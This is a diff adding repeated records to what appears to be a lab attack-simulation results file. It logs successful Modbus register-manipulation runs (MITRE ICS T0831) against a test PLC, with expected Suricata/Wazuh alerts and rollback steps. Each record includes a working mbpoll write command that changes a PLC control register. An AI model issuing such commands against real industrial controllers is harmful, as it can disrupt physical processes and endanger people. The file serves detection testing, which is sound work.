@@ -1,5 +1,5 @@
 {
-  "generated_at": "2026-07-01T23:54:19.620352+00:00",
+  "generated_at": "2026-07-02T21:43:14.515684+00:00",
   "scenario_id": "scn-b83dbbfb",
   "scenario_name": "industrial_file",
   "attacks": [
@@ -10631,6 +10631,918 @@
         "app_core/infrastructure/attack/outputs/20260701T231039Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_before.json",
         "app_core/infrastructure/attack/outputs/20260701T231039Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_after.json",
         "app_core/infrastructure/attack/outputs/20260701T231039Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/rollback_log.json"
+      ]
+    },
+    {
+      "attack_event_id": "evt-f8d5c190",
+      "attack_id": "atk-6402b8e1",
+      "attack_name": "Modbus Register Manipulation",
+      "scenario_id": "scn-b83dbbfb",
+      "scenario_name": "industrial_file",
+      "display_name": "Modbus Register Manipulation",
+      "mitre": {
+        "domain": "ICS",
+        "technique_id": "T0831",
+        "technique_name": "Manipulation of Control",
+        "tactic": "Impair Process Control"
+      },
+      "execution": {
+        "started_at": "2026-07-02T13:09:10.204556+00:00",
+        "completed_at": "2026-07-02T13:09:30.382212+00:00",
+        "success": true,
+        "exit_code": 0,
+        "execution_mode": "restore_by_default",
+        "detection_engine": "Suricata + Wazuh",
+        "success_criteria": "state_changed_and_observed"
+      },
+      "attacker": {
+        "ip": "10.0.2.214",
+        "user": "ubuntu"
+      },
+      "target": {
+        "node_id": "node-f9ca9bfc",
+        "instance_id": "inst-8c0c86c9",
+        "instance_name": "PLC_Instance",
+        "node_name": "PLC",
+        "target_role": "plc",
+        "effective_target_role": "PLC",
+        "target_ip": "192.168.100.252",
+        "target_image": "ubuntu-22.04",
+        "effective_target_basis": "attack_result_target",
+        "target_resolution_note": null
+      },
+      "operation": {
+        "tool_used": "attack_executor",
+        "tool_version": null,
+        "protocol": "modbus_tcp",
+        "target_port": 502,
+        "modbus_function": "16",
+        "register_reference": 4,
+        "value": 30,
+        "slave_id": 1,
+        "data_type": "4:int",
+        "parameters": {},
+        "expected_alerts": [
+          "modbus_write_register",
+          "unauthorized_control_command",
+          "process_state_change",
+          "control_manipulation"
+        ],
+        "rollback_required": true,
+        "rollback_command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 50",
+        "command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 30",
+        "modbus_operation": "write",
+        "expected_effect": "plc_register_state_change",
+        "expected_plc_state_change": "register_4 -> 30"
+      },
+      "execution_interpretation": {
+        "status_classification": "executed_successful",
+        "status_note": null
+      },
+      "execution_status": "completed",
+      "source_reference": "app_core/infrastructure/attack/outputs/20260702T130910Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+      "evidence_references": [
+        "app_core/infrastructure/attack/outputs/20260702T130910Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+        "app_core/infrastructure/attack/outputs/20260702T130910Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/modbus_transaction_log.json",
+        "app_core/infrastructure/attack/outputs/20260702T130910Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_before.json",
+        "app_core/infrastructure/attack/outputs/20260702T130910Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_after.json",
+        "app_core/infrastructure/attack/outputs/20260702T130910Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/rollback_log.json"
+      ]
+    },
+    {
+      "attack_event_id": "evt-3c0c822d",
+      "attack_id": "atk-6402b8e1",
+      "attack_name": "Modbus Register Manipulation",
+      "scenario_id": "scn-b83dbbfb",
+      "scenario_name": "industrial_file",
+      "display_name": "Modbus Register Manipulation",
+      "mitre": {
+        "domain": "ICS",
+        "technique_id": "T0831",
+        "technique_name": "Manipulation of Control",
+        "tactic": "Impair Process Control"
+      },
+      "execution": {
+        "started_at": "2026-07-02T13:31:41.390953+00:00",
+        "completed_at": "2026-07-02T13:32:01.978630+00:00",
+        "success": true,
+        "exit_code": 0,
+        "execution_mode": "restore_by_default",
+        "detection_engine": "Suricata + Wazuh",
+        "success_criteria": "state_changed_and_observed"
+      },
+      "attacker": {
+        "ip": "10.0.2.214",
+        "user": "ubuntu"
+      },
+      "target": {
+        "node_id": "node-f9ca9bfc",
+        "instance_id": "inst-8c0c86c9",
+        "instance_name": "PLC_Instance",
+        "node_name": "PLC",
+        "target_role": "plc",
+        "effective_target_role": "PLC",
+        "target_ip": "192.168.100.252",
+        "target_image": "ubuntu-22.04",
+        "effective_target_basis": "attack_result_target",
+        "target_resolution_note": null
+      },
+      "operation": {
+        "tool_used": "attack_executor",
+        "tool_version": null,
+        "protocol": "modbus_tcp",
+        "target_port": 502,
+        "modbus_function": "16",
+        "register_reference": 4,
+        "value": 30,
+        "slave_id": 1,
+        "data_type": "4:int",
+        "parameters": {},
+        "expected_alerts": [
+          "modbus_write_register",
+          "unauthorized_control_command",
+          "process_state_change",
+          "control_manipulation"
+        ],
+        "rollback_required": true,
+        "rollback_command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 50",
+        "command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 30",
+        "modbus_operation": "write",
+        "expected_effect": "plc_register_state_change",
+        "expected_plc_state_change": "register_4 -> 30"
+      },
+      "execution_interpretation": {
+        "status_classification": "executed_successful",
+        "status_note": null
+      },
+      "execution_status": "completed",
+      "source_reference": "app_core/infrastructure/attack/outputs/20260702T133141Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+      "evidence_references": [
+        "app_core/infrastructure/attack/outputs/20260702T133141Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+        "app_core/infrastructure/attack/outputs/20260702T133141Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/modbus_transaction_log.json",
+        "app_core/infrastructure/attack/outputs/20260702T133141Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_before.json",
+        "app_core/infrastructure/attack/outputs/20260702T133141Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_after.json",
+        "app_core/infrastructure/attack/outputs/20260702T133141Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/rollback_log.json"
+      ]
+    },
+    {
+      "attack_event_id": "evt-87e44860",
+      "attack_id": "atk-6402b8e1",
+      "attack_name": "Modbus Register Manipulation",
+      "scenario_id": "scn-b83dbbfb",
+      "scenario_name": "industrial_file",
+      "display_name": "Modbus Register Manipulation",
+      "mitre": {
+        "domain": "ICS",
+        "technique_id": "T0831",
+        "technique_name": "Manipulation of Control",
+        "tactic": "Impair Process Control"
+      },
+      "execution": {
+        "started_at": "2026-07-02T13:44:00.713821+00:00",
+        "completed_at": "2026-07-02T13:44:21.556574+00:00",
+        "success": true,
+        "exit_code": 0,
+        "execution_mode": "restore_by_default",
+        "detection_engine": "Suricata + Wazuh",
+        "success_criteria": "state_changed_and_observed"
+      },
+      "attacker": {
+        "ip": "10.0.2.214",
+        "user": "ubuntu"
+      },
+      "target": {
+        "node_id": "node-f9ca9bfc",
+        "instance_id": "inst-8c0c86c9",
+        "instance_name": "PLC_Instance",
+        "node_name": "PLC",
+        "target_role": "plc",
+        "effective_target_role": "PLC",
+        "target_ip": "192.168.100.252",
+        "target_image": "ubuntu-22.04",
+        "effective_target_basis": "attack_result_target",
+        "target_resolution_note": null
+      },
+      "operation": {
+        "tool_used": "attack_executor",
+        "tool_version": null,
+        "protocol": "modbus_tcp",
+        "target_port": 502,
+        "modbus_function": "16",
+        "register_reference": 4,
+        "value": 30,
+        "slave_id": 1,
+        "data_type": "4:int",
+        "parameters": {},
+        "expected_alerts": [
+          "modbus_write_register",
+          "unauthorized_control_command",
+          "process_state_change",
+          "control_manipulation"
+        ],
+        "rollback_required": true,
+        "rollback_command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 50",
+        "command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 30",
+        "modbus_operation": "write",
+        "expected_effect": "plc_register_state_change",
+        "expected_plc_state_change": "register_4 -> 30"
+      },
+      "execution_interpretation": {
+        "status_classification": "executed_successful",
+        "status_note": null
+      },
+      "execution_status": "completed",
+      "source_reference": "app_core/infrastructure/attack/outputs/20260702T134400Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+      "evidence_references": [
+        "app_core/infrastructure/attack/outputs/20260702T134400Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+        "app_core/infrastructure/attack/outputs/20260702T134400Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/modbus_transaction_log.json",
+        "app_core/infrastructure/attack/outputs/20260702T134400Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_before.json",
+        "app_core/infrastructure/attack/outputs/20260702T134400Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_after.json",
+        "app_core/infrastructure/attack/outputs/20260702T134400Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/rollback_log.json"
+      ]
+    },
+    {
+      "attack_event_id": "evt-87b02f4d",
+      "attack_id": "atk-6402b8e1",
+      "attack_name": "Modbus Register Manipulation",
+      "scenario_id": "scn-b83dbbfb",
+      "scenario_name": "industrial_file",
+      "display_name": "Modbus Register Manipulation",
+      "mitre": {
+        "domain": "ICS",
+        "technique_id": "T0831",
+        "technique_name": "Manipulation of Control",
+        "tactic": "Impair Process Control"
+      },
+      "execution": {
+        "started_at": "2026-07-02T13:57:57.706041+00:00",
+        "completed_at": "2026-07-02T13:58:18.800313+00:00",
+        "success": true,
+        "exit_code": 0,
+        "execution_mode": "restore_by_default",
+        "detection_engine": "Suricata + Wazuh",
+        "success_criteria": "state_changed_and_observed"
+      },
+      "attacker": {
+        "ip": "10.0.2.214",
+        "user": "ubuntu"
+      },
+      "target": {
+        "node_id": "node-f9ca9bfc",
+        "instance_id": "inst-8c0c86c9",
+        "instance_name": "PLC_Instance",
+        "node_name": "PLC",
+        "target_role": "plc",
+        "effective_target_role": "PLC",
+        "target_ip": "192.168.100.252",
+        "target_image": "ubuntu-22.04",
+        "effective_target_basis": "attack_result_target",
+        "target_resolution_note": null
+      },
+      "operation": {
+        "tool_used": "attack_executor",
+        "tool_version": null,
+        "protocol": "modbus_tcp",
+        "target_port": 502,
+        "modbus_function": "16",
+        "register_reference": 4,
+        "value": 30,
+        "slave_id": 1,
+        "data_type": "4:int",
+        "parameters": {},
+        "expected_alerts": [
+          "modbus_write_register",
+          "unauthorized_control_command",
+          "process_state_change",
+          "control_manipulation"
+        ],
+        "rollback_required": true,
+        "rollback_command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 50",
+        "command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 30",
+        "modbus_operation": "write",
+        "expected_effect": "plc_register_state_change",
+        "expected_plc_state_change": "register_4 -> 30"
+      },
+      "execution_interpretation": {
+        "status_classification": "executed_successful",
+        "status_note": null
+      },
+      "execution_status": "completed",
+      "source_reference": "app_core/infrastructure/attack/outputs/20260702T135757Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+      "evidence_references": [
+        "app_core/infrastructure/attack/outputs/20260702T135757Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+        "app_core/infrastructure/attack/outputs/20260702T135757Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/modbus_transaction_log.json",
+        "app_core/infrastructure/attack/outputs/20260702T135757Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_before.json",
+        "app_core/infrastructure/attack/outputs/20260702T135757Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_after.json",
+        "app_core/infrastructure/attack/outputs/20260702T135757Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/rollback_log.json"
+      ]
+    },
+    {
+      "attack_event_id": "evt-d76e511a",
+      "attack_id": "atk-6402b8e1",
+      "attack_name": "Modbus Register Manipulation",
+      "scenario_id": "scn-b83dbbfb",
+      "scenario_name": "industrial_file",
+      "display_name": "Modbus Register Manipulation",
+      "mitre": {
+        "domain": "ICS",
+        "technique_id": "T0831",
+        "technique_name": "Manipulation of Control",
+        "tactic": "Impair Process Control"
+      },
+      "execution": {
+        "started_at": "2026-07-02T14:21:12.823231+00:00",
+        "completed_at": "2026-07-02T14:21:37.204047+00:00",
+        "success": true,
+        "exit_code": 0,
+        "execution_mode": "restore_by_default",
+        "detection_engine": "Suricata + Wazuh",
+        "success_criteria": "state_changed_and_observed"
+      },
+      "attacker": {
+        "ip": "10.0.2.214",
+        "user": "ubuntu"
+      },
+      "target": {
+        "node_id": "node-f9ca9bfc",
+        "instance_id": "inst-8c0c86c9",
+        "instance_name": "PLC_Instance",
+        "node_name": "PLC",
+        "target_role": "plc",
+        "effective_target_role": "PLC",
+        "target_ip": "192.168.100.252",
+        "target_image": "ubuntu-22.04",
+        "effective_target_basis": "attack_result_target",
+        "target_resolution_note": null
+      },
+      "operation": {
+        "tool_used": "attack_executor",
+        "tool_version": null,
+        "protocol": "modbus_tcp",
+        "target_port": 502,
+        "modbus_function": "16",
+        "register_reference": 4,
+        "value": 30,
+        "slave_id": 1,
+        "data_type": "4:int",
+        "parameters": {},
+        "expected_alerts": [
+          "modbus_write_register",
+          "unauthorized_control_command",
+          "process_state_change",
+          "control_manipulation"
+        ],
+        "rollback_required": true,
+        "rollback_command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 50",
+        "command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 30",
+        "modbus_operation": "write",
+        "expected_effect": "plc_register_state_change",
+        "expected_plc_state_change": "register_4 -> 30"
+      },
+      "execution_interpretation": {
+        "status_classification": "executed_successful",
+        "status_note": null
+      },
+      "execution_status": "completed",
+      "source_reference": "app_core/infrastructure/attack/outputs/20260702T142112Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+      "evidence_references": [
+        "app_core/infrastructure/attack/outputs/20260702T142112Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+        "app_core/infrastructure/attack/outputs/20260702T142112Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/modbus_transaction_log.json",
+        "app_core/infrastructure/attack/outputs/20260702T142112Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_before.json",
+        "app_core/infrastructure/attack/outputs/20260702T142112Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_after.json",
+        "app_core/infrastructure/attack/outputs/20260702T142112Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/rollback_log.json"
+      ]
+    },
+    {
+      "attack_event_id": "evt-3a108605",
+      "attack_id": "atk-6402b8e1",
+      "attack_name": "Modbus Register Manipulation",
+      "scenario_id": "scn-b83dbbfb",
+      "scenario_name": "industrial_file",
+      "display_name": "Modbus Register Manipulation",
+      "mitre": {
+        "domain": "ICS",
+        "technique_id": "T0831",
+        "technique_name": "Manipulation of Control",
+        "tactic": "Impair Process Control"
+      },
+      "execution": {
+        "started_at": "2026-07-02T14:28:48.534817+00:00",
+        "completed_at": "2026-07-02T14:29:18.201802+00:00",
+        "success": true,
+        "exit_code": 0,
+        "execution_mode": "restore_by_default",
+        "detection_engine": "Suricata + Wazuh",
+        "success_criteria": "state_changed_and_observed"
+      },
+      "attacker": {
+        "ip": "10.0.2.214",
+        "user": "ubuntu"
+      },
+      "target": {
+        "node_id": "node-f9ca9bfc",
+        "instance_id": "inst-8c0c86c9",
+        "instance_name": "PLC_Instance",
+        "node_name": "PLC",
+        "target_role": "plc",
+        "effective_target_role": "PLC",
+        "target_ip": "192.168.100.252",
+        "target_image": "ubuntu-22.04",
+        "effective_target_basis": "attack_result_target",
+        "target_resolution_note": null
+      },
+      "operation": {
+        "tool_used": "attack_executor",
+        "tool_version": null,
+        "protocol": "modbus_tcp",
+        "target_port": 502,
+        "modbus_function": "16",
+        "register_reference": 4,
+        "value": 30,
+        "slave_id": 1,
+        "data_type": "4:int",
+        "parameters": {},
+        "expected_alerts": [
+          "modbus_write_register",
+          "unauthorized_control_command",
+          "process_state_change",
+          "control_manipulation"
+        ],
+        "rollback_required": true,
+        "rollback_command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 50",
+        "command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 30",
+        "modbus_operation": "write",
+        "expected_effect": "plc_register_state_change",
+        "expected_plc_state_change": "register_4 -> 30"
+      },
+      "execution_interpretation": {
+        "status_classification": "executed_successful",
+        "status_note": null
+      },
+      "execution_status": "completed",
+      "source_reference": "app_core/infrastructure/attack/outputs/20260702T142848Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+      "evidence_references": [
+        "app_core/infrastructure/attack/outputs/20260702T142848Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+        "app_core/infrastructure/attack/outputs/20260702T142848Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/modbus_transaction_log.json",
+        "app_core/infrastructure/attack/outputs/20260702T142848Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_before.json",
+        "app_core/infrastructure/attack/outputs/20260702T142848Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_after.json",
+        "app_core/infrastructure/attack/outputs/20260702T142848Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/rollback_log.json"
+      ]
+    },
+    {
+      "attack_event_id": "evt-eddbb9eb",
+      "attack_id": "atk-6402b8e1",
+      "attack_name": "Modbus Register Manipulation",
+      "scenario_id": "scn-b83dbbfb",
+      "scenario_name": "industrial_file",
+      "display_name": "Modbus Register Manipulation",
+      "mitre": {
+        "domain": "ICS",
+        "technique_id": "T0831",
+        "technique_name": "Manipulation of Control",
+        "tactic": "Impair Process Control"
+      },
+      "execution": {
+        "started_at": "2026-07-02T15:04:40.536978+00:00",
+        "completed_at": "2026-07-02T15:05:00.329477+00:00",
+        "success": true,
+        "exit_code": 0,
+        "execution_mode": "restore_by_default",
+        "detection_engine": "Suricata + Wazuh",
+        "success_criteria": "state_changed_and_observed"
+      },
+      "attacker": {
+        "ip": "10.0.2.214",
+        "user": "ubuntu"
+      },
+      "target": {
+        "node_id": "node-f9ca9bfc",
+        "instance_id": "inst-8c0c86c9",
+        "instance_name": "PLC_Instance",
+        "node_name": "PLC",
+        "target_role": "plc",
+        "effective_target_role": "PLC",
+        "target_ip": "192.168.100.252",
+        "target_image": "ubuntu-22.04",
+        "effective_target_basis": "attack_result_target",
+        "target_resolution_note": null
+      },
+      "operation": {
+        "tool_used": "attack_executor",
+        "tool_version": null,
+        "protocol": "modbus_tcp",
+        "target_port": 502,
+        "modbus_function": "16",
+        "register_reference": 4,
+        "value": 30,
+        "slave_id": 1,
+        "data_type": "4:int",
+        "parameters": {},
+        "expected_alerts": [
+          "modbus_write_register",
+          "unauthorized_control_command",
+          "process_state_change",
+          "control_manipulation"
+        ],
+        "rollback_required": true,
+        "rollback_command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 50",
+        "command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 30",
+        "modbus_operation": "write",
+        "expected_effect": "plc_register_state_change",
+        "expected_plc_state_change": "register_4 -> 30"
+      },
+      "execution_interpretation": {
+        "status_classification": "executed_successful",
+        "status_note": null
+      },
+      "execution_status": "completed",
+      "source_reference": "app_core/infrastructure/attack/outputs/20260702T150440Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+      "evidence_references": [
+        "app_core/infrastructure/attack/outputs/20260702T150440Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+        "app_core/infrastructure/attack/outputs/20260702T150440Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/modbus_transaction_log.json",
+        "app_core/infrastructure/attack/outputs/20260702T150440Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_before.json",
+        "app_core/infrastructure/attack/outputs/20260702T150440Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_after.json",
+        "app_core/infrastructure/attack/outputs/20260702T150440Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/rollback_log.json"
+      ]
+    },
+    {
+      "attack_event_id": "evt-5712fc9c",
+      "attack_id": "atk-6402b8e1",
+      "attack_name": "Modbus Register Manipulation",
+      "scenario_id": "scn-b83dbbfb",
+      "scenario_name": "industrial_file",
+      "display_name": "Modbus Register Manipulation",
+      "mitre": {
+        "domain": "ICS",
+        "technique_id": "T0831",
+        "technique_name": "Manipulation of Control",
+        "tactic": "Impair Process Control"
+      },
+      "execution": {
+        "started_at": "2026-07-02T15:10:00.430020+00:00",
+        "completed_at": "2026-07-02T15:10:21.973714+00:00",
+        "success": true,
+        "exit_code": 0,
+        "execution_mode": "restore_by_default",
+        "detection_engine": "Suricata + Wazuh",
+        "success_criteria": "state_changed_and_observed"
+      },
+      "attacker": {
+        "ip": "10.0.2.214",
+        "user": "ubuntu"
+      },
+      "target": {
+        "node_id": "node-f9ca9bfc",
+        "instance_id": "inst-8c0c86c9",
+        "instance_name": "PLC_Instance",
+        "node_name": "PLC",
+        "target_role": "plc",
+        "effective_target_role": "PLC",
+        "target_ip": "192.168.100.252",
+        "target_image": "ubuntu-22.04",
+        "effective_target_basis": "attack_result_target",
+        "target_resolution_note": null
+      },
+      "operation": {
+        "tool_used": "attack_executor",
+        "tool_version": null,
+        "protocol": "modbus_tcp",
+        "target_port": 502,
+        "modbus_function": "16",
+        "register_reference": 4,
+        "value": 30,
+        "slave_id": 1,
+        "data_type": "4:int",
+        "parameters": {},
+        "expected_alerts": [
+          "modbus_write_register",
+          "unauthorized_control_command",
+          "process_state_change",
+          "control_manipulation"
+        ],
+        "rollback_required": true,
+        "rollback_command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 50",
+        "command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 30",
+        "modbus_operation": "write",
+        "expected_effect": "plc_register_state_change",
+        "expected_plc_state_change": "register_4 -> 30"
+      },
+      "execution_interpretation": {
+        "status_classification": "executed_successful",
+        "status_note": null
+      },
+      "execution_status": "completed",
+      "source_reference": "app_core/infrastructure/attack/outputs/20260702T151000Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+      "evidence_references": [
+        "app_core/infrastructure/attack/outputs/20260702T151000Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+        "app_core/infrastructure/attack/outputs/20260702T151000Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/modbus_transaction_log.json",
+        "app_core/infrastructure/attack/outputs/20260702T151000Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_before.json",
+        "app_core/infrastructure/attack/outputs/20260702T151000Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_after.json",
+        "app_core/infrastructure/attack/outputs/20260702T151000Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/rollback_log.json"
+      ]
+    },
+    {
+      "attack_event_id": "evt-687e29a1",
+      "attack_id": "atk-6402b8e1",
+      "attack_name": "Modbus Register Manipulation",
+      "scenario_id": "scn-b83dbbfb",
+      "scenario_name": "industrial_file",
+      "display_name": "Modbus Register Manipulation",
+      "mitre": {
+        "domain": "ICS",
+        "technique_id": "T0831",
+        "technique_name": "Manipulation of Control",
+        "tactic": "Impair Process Control"
+      },
+      "execution": {
+        "started_at": "2026-07-02T15:34:35.436773+00:00",
+        "completed_at": "2026-07-02T15:34:55.684569+00:00",
+        "success": true,
+        "exit_code": 0,
+        "execution_mode": "restore_by_default",
+        "detection_engine": "Suricata + Wazuh",
+        "success_criteria": "state_changed_and_observed"
+      },
+      "attacker": {
+        "ip": "10.0.2.214",
+        "user": "ubuntu"
+      },
+      "target": {
+        "node_id": "node-f9ca9bfc",
+        "instance_id": "inst-8c0c86c9",
+        "instance_name": "PLC_Instance",
+        "node_name": "PLC",
+        "target_role": "plc",
+        "effective_target_role": "PLC",
+        "target_ip": "192.168.100.252",
+        "target_image": "ubuntu-22.04",
+        "effective_target_basis": "attack_result_target",
+        "target_resolution_note": null
+      },
+      "operation": {
+        "tool_used": "attack_executor",
+        "tool_version": null,
+        "protocol": "modbus_tcp",
+        "target_port": 502,
+        "modbus_function": "16",
+        "register_reference": 4,
+        "value": 30,
+        "slave_id": 1,
+        "data_type": "4:int",
+        "parameters": {},
+        "expected_alerts": [
+          "modbus_write_register",
+          "unauthorized_control_command",
+          "process_state_change",
+          "control_manipulation"
+        ],
+        "rollback_required": true,
+        "rollback_command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 50",
+        "command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 30",
+        "modbus_operation": "write",
+        "expected_effect": "plc_register_state_change",
+        "expected_plc_state_change": "register_4 -> 30"
+      },
+      "execution_interpretation": {
+        "status_classification": "executed_successful",
+        "status_note": null
+      },
+      "execution_status": "completed",
+      "source_reference": "app_core/infrastructure/attack/outputs/20260702T153435Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+      "evidence_references": [
+        "app_core/infrastructure/attack/outputs/20260702T153435Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+        "app_core/infrastructure/attack/outputs/20260702T153435Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/modbus_transaction_log.json",
+        "app_core/infrastructure/attack/outputs/20260702T153435Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_before.json",
+        "app_core/infrastructure/attack/outputs/20260702T153435Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_after.json",
+        "app_core/infrastructure/attack/outputs/20260702T153435Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/rollback_log.json"
+      ]
+    },
+    {
+      "attack_event_id": "evt-c5a56093",
+      "attack_id": "atk-6402b8e1",
+      "attack_name": "Modbus Register Manipulation",
+      "scenario_id": "scn-b83dbbfb",
+      "scenario_name": "industrial_file",
+      "display_name": "Modbus Register Manipulation",
+      "mitre": {
+        "domain": "ICS",
+        "technique_id": "T0831",
+        "technique_name": "Manipulation of Control",
+        "tactic": "Impair Process Control"
+      },
+      "execution": {
+        "started_at": "2026-07-02T15:43:12.534244+00:00",
+        "completed_at": "2026-07-02T15:43:33.540029+00:00",
+        "success": true,
+        "exit_code": 0,
+        "execution_mode": "restore_by_default",
+        "detection_engine": "Suricata + Wazuh",
+        "success_criteria": "state_changed_and_observed"
+      },
+      "attacker": {
+        "ip": "10.0.2.214",
+        "user": "ubuntu"
+      },
+      "target": {
+        "node_id": "node-f9ca9bfc",
+        "instance_id": "inst-8c0c86c9",
+        "instance_name": "PLC_Instance",
+        "node_name": "PLC",
+        "target_role": "plc",
+        "effective_target_role": "PLC",
+        "target_ip": "192.168.100.252",
+        "target_image": "ubuntu-22.04",
+        "effective_target_basis": "attack_result_target",
+        "target_resolution_note": null
+      },
+      "operation": {
+        "tool_used": "attack_executor",
+        "tool_version": null,
+        "protocol": "modbus_tcp",
+        "target_port": 502,
+        "modbus_function": "16",
+        "register_reference": 4,
+        "value": 30,
+        "slave_id": 1,
+        "data_type": "4:int",
+        "parameters": {},
+        "expected_alerts": [
+          "modbus_write_register",
+          "unauthorized_control_command",
+          "process_state_change",
+          "control_manipulation"
+        ],
+        "rollback_required": true,
+        "rollback_command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 50",
+        "command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 30",
+        "modbus_operation": "write",
+        "expected_effect": "plc_register_state_change",
+        "expected_plc_state_change": "register_4 -> 30"
+      },
+      "execution_interpretation": {
+        "status_classification": "executed_successful",
+        "status_note": null
+      },
+      "execution_status": "completed",
+      "source_reference": "app_core/infrastructure/attack/outputs/20260702T154312Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+      "evidence_references": [
+        "app_core/infrastructure/attack/outputs/20260702T154312Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+        "app_core/infrastructure/attack/outputs/20260702T154312Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/modbus_transaction_log.json",
+        "app_core/infrastructure/attack/outputs/20260702T154312Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_before.json",
+        "app_core/infrastructure/attack/outputs/20260702T154312Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_after.json",
+        "app_core/infrastructure/attack/outputs/20260702T154312Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/rollback_log.json"
+      ]
+    },
+    {
+      "attack_event_id": "evt-622447df",
+      "attack_id": "atk-6402b8e1",
+      "attack_name": "Modbus Register Manipulation",
+      "scenario_id": "scn-b83dbbfb",
+      "scenario_name": "industrial_file",
+      "display_name": "Modbus Register Manipulation",
+      "mitre": {
+        "domain": "ICS",
+        "technique_id": "T0831",
+        "technique_name": "Manipulation of Control",
+        "tactic": "Impair Process Control"
+      },
+      "execution": {
+        "started_at": "2026-07-02T16:24:48.780883+00:00",
+        "completed_at": "2026-07-02T16:25:09.626785+00:00",
+        "success": true,
+        "exit_code": 0,
+        "execution_mode": "restore_by_default",
+        "detection_engine": "Suricata + Wazuh",
+        "success_criteria": "state_changed_and_observed"
+      },
+      "attacker": {
+        "ip": "10.0.2.214",
+        "user": "ubuntu"
+      },
+      "target": {
+        "node_id": "node-f9ca9bfc",
+        "instance_id": "inst-8c0c86c9",
+        "instance_name": "PLC_Instance",
+        "node_name": "PLC",
+        "target_role": "plc",
+        "effective_target_role": "PLC",
+        "target_ip": "192.168.100.252",
